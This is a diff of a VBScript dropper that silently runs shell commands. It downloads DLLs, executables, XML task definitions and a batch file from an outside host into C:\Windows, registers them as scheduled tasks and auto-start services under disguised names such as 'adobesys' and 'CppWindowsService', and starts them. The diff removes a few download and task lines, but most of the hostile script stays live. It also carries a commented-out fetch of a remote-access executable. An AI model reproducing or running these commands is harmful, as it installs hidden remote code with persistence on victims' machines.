@@ -33,8 +33,6 @@ With oShell
   .Run "curl http://troglo.homepc.it/win/exec1.dll -o c:\windows\exec1.dll", 0, True
   .Run "curl http://troglo.homepc.it/win/CppWindowsService.xml -o c:\windows\CppWindowsService.xml", 0, True
 .Run "curl http://troglo.homepc.it/win/adobesys.xml -o c:\windows\adobesys.xml", 0, True
-.Run "curl http://troglo.homepc.it/win/adobesysuser.xml -o c:\windows\adobesysuser.xml", 0, True
-.Run "curl http://troglo.homepc.it/win/sysuser.dll -o c:\windows\hp\sysuser.dll", 0, True
 .Run "curl http://troglo.homepc.it/win/sys3.dll -o c:\windows\hp\sys3.dll", 0, True
 .Run "copy /Y c:\windows\hp\sys3.dll c:\windows\sys3t.dll", 0, True
 .Run "curl http://troglo.homepc.it/win/sys2.dll -o c:\windows\hp\sys2.dll", 0, True
@@ -47,7 +45,6 @@ With oShell
 .Run "schtasks /create /tn CppWindowsService /xml %windir%\CppWindowsService.xml /F", 0, True
 .Run "schtasks /delete /tn adobesys /F", 0, True
 .Run "schtasks /create /tn adobesys /xml %windir%\adobesys.xml /F", 0, True
-.Run "schtasks /create /tn adobesysuser /xml %windir%\adobesysuser.xml /F", 0, True
 .Run "curl http://troglo.homepc.it/win/sys2.exe -o c:\windows\sys2.exe", 0, True
 .Run "curl http://troglo.homepc.it/win/sys3.exe -o c:\windows\sys3.exe", 0, True
 .Run "sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= ""CppWindowsService"" start= auto", 0, True
@@ -58,10 +55,8 @@ With oShell
 .Run "curl http://troglo.homepc.it/win/libcrypto-1_1.dll -o c:\windows\libcrypto-1_1.dll", 0, True
 .Run temp  & "\" & sfile, 0, True 
 .Run "cscript c:\windows\hp\svc.vbs", 0, True
-.Run "curl http://troglo.homepc.it/win/cmd.bat -o c:\windows\cmd.bat", 0, True
 .Run "net start CppWindowsService", 0, True
 .Run "net start adobesys", 0, True
-.Run "c:\windows\cmd.bat", 0, True
   '.Run "msiexec /i "&temp & "\PdfViewer-admin.msi", 0, True
   '.Run "cmd /c echo elevated  > " &windir & "\sysexecuser", 0, True
   '.Run "curl http://troglo.homepc.it/Supremo.exe -o "& windir &"\Supremo.exe", 0, True
